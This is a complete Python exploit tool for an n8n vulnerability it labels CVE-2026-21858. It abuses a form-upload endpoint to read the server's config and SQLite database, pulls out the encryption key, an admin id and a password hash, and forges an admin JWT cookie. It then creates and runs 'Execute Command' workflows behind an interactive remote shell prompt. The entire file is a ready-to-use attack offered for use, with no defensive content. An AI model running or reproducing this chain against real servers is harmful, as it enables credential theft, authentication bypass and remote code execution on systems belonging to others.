import requests
import json
import time
import hashlib
import jwt
import re
from base64 import b64encode
from urllib.parse import urlparse

# --- [Global Settings] ---
TARGET_URL = ""
FORM_PATH = ""
HOME_DIR = "/home/n8n"
MY_BROWSER_ID = "browser_id"

SESSION_HEADERS = {}
SESSION_COOKIES = {}

# --- [0. URL Parser] ---
def parse_target_info(full_url):
    global TARGET_URL, FORM_PATH
    try:
        parsed = urlparse(full_url)
        # Extract Protocol + Domain + Port (ex: http://localhost:9000)
        TARGET_URL = f"{parsed.scheme}://{parsed.netloc}"
        # Extract Path (ex: /form/ebdb66... )
        FORM_PATH = parsed.path
        return True
    except Exception as e:
        print(f"[-] URL Parsing Error: {e}")
        return False

# --- [1. Asset Extraction Logic] ---
def get_actual_data(filepath):
    filename = filepath.split('/')[-1]
    url = f"{TARGET_URL.rstrip('/')}/{FORM_PATH.lstrip('/')}"
    
    payload = {
        "data": {},
        "files": { "file": { "filepath": filepath, "originalFilename": "pwn.txt" } }
    }
    try:
        res = requests.post(url, json=payload, timeout=30)
        res_json = res.json()
        waiting_url = res_json.get("formWaitingUrl")
        
        if not waiting_url: return None
        
        # --- [Host Synchronization] ---
        parsed_target = urlparse(TARGET_URL)
        parsed_waiting = urlparse(waiting_url)
        
        # Force host synchronization if netloc differs
        if parsed_waiting.netloc != parsed_target.netloc:
            waiting_url = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_waiting.path}"
            if parsed_waiting.query:
                waiting_url += f"?{parsed_waiting.query}"
        # -----------------------------
        
        print(f"  [>] Extracting {filename} (Target: {waiting_url})")
        time.sleep(5)
        data_res = requests.get(waiting_url, timeout=120)
        return data_res.text
    except Exception as e:
        print(f"  [-] {filename} Extraction Error: {e}")
        return None

def extract_assets():
    print("\n" + "="*60)
    print(" n8n CVE-2026-21858 Asset Extractor & RCE")
    print(f" Target: {TARGET_URL}")
    print(f" Path:   {FORM_PATH}")
    print("="*60)

    config_raw = get_actual_data(f"{HOME_DIR}/.n8n/config")
    if not config_raw: return None
    match = re.search(r'"encryptionKey"\s*:\s*"([^"]+)"', config_raw)
    if not match: return None
    enc_key = match.group(1)
    final_secret = hashlib.sha256(enc_key[::2].encode()).hexdigest()

    db_text = get_actual_data(f"{HOME_DIR}/.n8n/database.sqlite")
    if not db_text: return None

    uuid_raw = r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}'
    bcrypt_raw = r'\$2[ab]\$10\$[./A-Za-z0-9]{53}'
    email_raw = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}'

    pws = re.findall(bcrypt_raw, db_text)
    emails = re.findall(email_raw, db_text)
    
    target_id = None
    if pws:
        pw_idx = db_text.find(pws[0])
        search_range = db_text[max(0, pw_idx-300) : pw_idx+300]
        near_uuids = re.findall(uuid_raw, search_range)
        if near_uuids:
            target_id = near_uuids[0]

    if target_id and pws and emails:
        combined = f"{emails[0]}:{pws[0]}".encode()
        admin_hash = b64encode(hashlib.sha256(combined).digest()).decode()[:10]
        
        setup_session(final_secret, target_id, admin_hash)
        
        print(f" [+] Success: SECRET_KEY = \"{final_secret}\"")
        print(f" [+] Success: admin_id = \"{target_id}\"")
        print(f" [+] Success: admin_hash = \"{admin_hash}\"")
        return True
    return False

def setup_session(f_secret, a_id, a_hash):
    global SESSION_HEADERS, SESSION_COOKIES
    hashed_browser_id = b64encode(hashlib.sha256(MY_BROWSER_ID.encode()).digest()).decode()
    payload = {
        "id": a_id, "hash": a_hash, "browserId": hashed_browser_id,
        "usedMfa": False, "iat": int(time.time()), "exp": int(time.time()) + 86400
    }
    auth_token = jwt.encode(payload, f_secret, algorithm="HS256")
    SESSION_HEADERS = {
        "accept": "application/json", "content-type": "application/json",
        "browser-id": MY_BROWSER_ID, "user-agent": "Mozilla/5.0"
    }
    SESSION_COOKIES = {"n8n-auth": auth_token}

# --- [2. RCE Logic] ---
def run_full_chain(target_command):
    create_url = f"{TARGET_URL}/rest/workflows"
    new_workflow_data = {
        "name": f"POC_{int(time.time())}",
        "active": False,
        "nodes": [{
            "parameters": {"command": target_command},
            "name": "Execute Command",
            "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1,
            "position": [250, 250],
            "id": "node-pwn-01"
        }],
        "connections": {}
    }

    create_res = requests.post(create_url, headers=SESSION_HEADERS, cookies=SESSION_COOKIES, json=new_workflow_data)
    if create_res.status_code != 200:
        print(f"[-] Creation Failed: {create_res.status_code}\n{create_res.text}")
        return

    workflow_info = create_res.json().get("data")
    workflow_id = workflow_info.get("id")
    run_url = f"{TARGET_URL}/rest/workflows/{workflow_id}/run"
    run_res = requests.post(run_url, headers=SESSION_HEADERS, cookies=SESSION_COOKIES, json={"workflowData": workflow_info})
    
    if run_res.status_code == 200:
        execution_id = run_res.json().get("data", {}).get("executionId")
        time.sleep(0.5)
        result_res = requests.get(f"{TARGET_URL}/rest/executions/{execution_id}", headers=SESSION_HEADERS, cookies=SESSION_COOKIES)
        if result_res.ok:
            try:
                raw_exec_data = result_res.json().get('data', {}).get('data', '[]')
                exec_data = json.loads(raw_exec_data)
                command_output = "No Output"
                for item in reversed(exec_data):
                    if isinstance(item, str) and len(item.strip()) > 0:
                        if item == "Execute Command" or item.startswith("node-"): continue
                        command_output = item
                        break
                print(f"\n[!] '{target_command}' Result:\n{'-'*30}\n{command_output.strip()}\n{'-'*30}")
            except: pass
    else:
        print(f"[-] Execution Failed: {run_res.text}")

if __name__ == "__main__":
    print("=== n8n RCE Tool Setup ===")
    form_url_input = input("Enter Form URL (ex: http://localhost:9000/form/...): ").strip()
    
    if parse_target_info(form_url_input):
        if extract_assets():
            print("\n=== n8n Shell Ready ===")
            while True:
                cmd_input = input("n8n-shell> ").strip()
                if cmd_input.lower() in ['exit', 'quit']: break
                if not cmd_input: continue
                run_full_chain(cmd_input)
        else:
            print("[-] Asset Extraction Failed. Check the URL or environment settings.")
    else:
        print("[-] Invalid URL.")